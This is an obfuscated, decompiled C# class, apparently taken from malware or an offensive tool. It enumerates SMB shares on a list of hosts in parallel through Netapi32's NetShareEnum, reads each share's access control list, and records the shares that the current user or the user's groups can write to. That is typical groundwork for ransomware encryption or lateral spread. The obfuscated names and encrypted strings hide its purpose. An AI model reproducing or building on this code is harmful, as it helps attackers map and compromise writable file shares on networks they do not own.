using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wawLLalyhHSFm;

internal sealed class cPLKTEvkFOK
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct HDkbvsoyXzSxer
	{
		public string THpwhbzaPT;

		public uint sOKEaBAftqz;

		public string EOXhjbGsWJJwyOe;

		public HDkbvsoyXzSxer(string string_0, uint uint_0, string string_1)
		{
			THpwhbzaPT = string_0;
			sOKEaBAftqz = uint_0;
			EOXhjbGsWJJwyOe = string_1;
		}

		public override string ToString()
		{
			return THpwhbzaPT;
		}
	}

	private sealed class jxGDgVedgKkRvTU
	{
		public zukOLaXeIDVsrj.cSVJqSKpvLR yXxYJKdYud;
	}

	private sealed class taQjtWLTeDaWUH
	{
		public jxGDgVedgKkRvTU wfljSfjKttBsl;

		public string vvdZYpnopBTY;

		public void _003CGetAllShares_003Eb__1()
		{
			hLQQohZLPvB(vvdZYpnopBTY, wfljSfjKttBsl.yXxYJKdYud);
		}
	}

	public static ReaderWriterLockSlim yQSpgXbxvdD;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static HDkbvsoyXzSxer[] zfLJYLmldLvT(string string_0)
	{
		List<HDkbvsoyXzSxer> list = new List<HDkbvsoyXzSxer>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(HDkbvsoyXzSxer));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				HDkbvsoyXzSxer item = (HDkbvsoyXzSxer)Marshal.PtrToStructure(ptr, typeof(HDkbvsoyXzSxer));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new HDkbvsoyXzSxer(getString_0(107397841) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	public static void hLQQohZLPvB(string string_0, zukOLaXeIDVsrj.cSVJqSKpvLR cSVJqSKpvLR_0)
	{
		string[] source = new string[2]
		{
			getString_0(107397864),
			getString_0(107397851)
		};
		HDkbvsoyXzSxer[] array = zfLJYLmldLvT(string_0);
		if (array.Length > 0)
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>();
			List<string> list3 = new List<string>();
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			string value = current.User!.Value;
			HDkbvsoyXzSxer[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				HDkbvsoyXzSxer hDkbvsoyXzSxer = array2[i];
				if (cSVJqSKpvLR_0.EJGUpkTebTaIUTvMn != null && cSVJqSKpvLR_0.EJGUpkTebTaIUTvMn.Contains(hDkbvsoyXzSxer.THpwhbzaPT.ToString().ToUpper()))
				{
					continue;
				}
				try
				{
					string text = string.Format(getString_0(107397806), string_0, hDkbvsoyXzSxer.THpwhbzaPT);
					Directory.GetFiles(text);
					list.Add(hDkbvsoyXzSxer.THpwhbzaPT);
					AuthorizationRuleCollection accessRules = Directory.GetAccessControl(text).GetAccessRules(includeExplicit: true, includeInherited: true, typeof(SecurityIdentifier));
					foreach (FileSystemAccessRule item in accessRules)
					{
						if ((item.IdentityReference.ToString() == value || current.Groups!.Contains(item.IdentityReference)) && item.FileSystemRights.HasFlag(FileSystemRights.Write) && item.AccessControlType == AccessControlType.Allow)
						{
							if (!ufSaqXYLSvVxK.apDawShQCtslB.Contains(text))
							{
								ufSaqXYLSvVxK.apDawShQCtslB.Add(text);
							}
							list2.Add(hDkbvsoyXzSxer.THpwhbzaPT);
							break;
						}
					}
				}
				catch
				{
					if (!source.Contains(hDkbvsoyXzSxer.THpwhbzaPT))
					{
						list3.Add(hDkbvsoyXzSxer.THpwhbzaPT);
					}
				}
			}
		}
		ZXjGVHpOWMG.lIjGSkYeXc++;
	}

	public static void tOyMBJaaZKo(List<string> list_0, zukOLaXeIDVsrj.cSVJqSKpvLR cSVJqSKpvLR_0)
	{
		jxGDgVedgKkRvTU jxGDgVedgKkRvTU = new jxGDgVedgKkRvTU();
		jxGDgVedgKkRvTU.yXxYJKdYud = cSVJqSKpvLR_0;
		List<Action> list = new List<Action>();
		using (List<string>.Enumerator enumerator = list_0.GetEnumerator())
		{
			while (enumerator.MoveNext())
			{
				Action action = null;
				taQjtWLTeDaWUH CS_0024_003C_003E8__locals0 = new taQjtWLTeDaWUH();
				CS_0024_003C_003E8__locals0.wfljSfjKttBsl = jxGDgVedgKkRvTU;
				CS_0024_003C_003E8__locals0.vvdZYpnopBTY = enumerator.Current;
				action = delegate
				{
					hLQQohZLPvB(CS_0024_003C_003E8__locals0.vvdZYpnopBTY, CS_0024_003C_003E8__locals0.wfljSfjKttBsl.yXxYJKdYud);
				};
				list.Add(action);
			}
		}
		ParallelOptions parallelOptions = new ParallelOptions();
		parallelOptions.MaxDegreeOfParallelism = jxGDgVedgKkRvTU.yXxYJKdYud.WsxNlAHvWSEeHP;
		ParallelOptions parallelOptions2 = parallelOptions;
		Parallel.Invoke(parallelOptions2, list.ToArray());
	}

	static cPLKTEvkFOK()
	{
		Strings.CreateGetStringDelegate(typeof(cPLKTEvkFOK));
		yQSpgXbxvdD = new ReaderWriterLockSlim();
	}
}
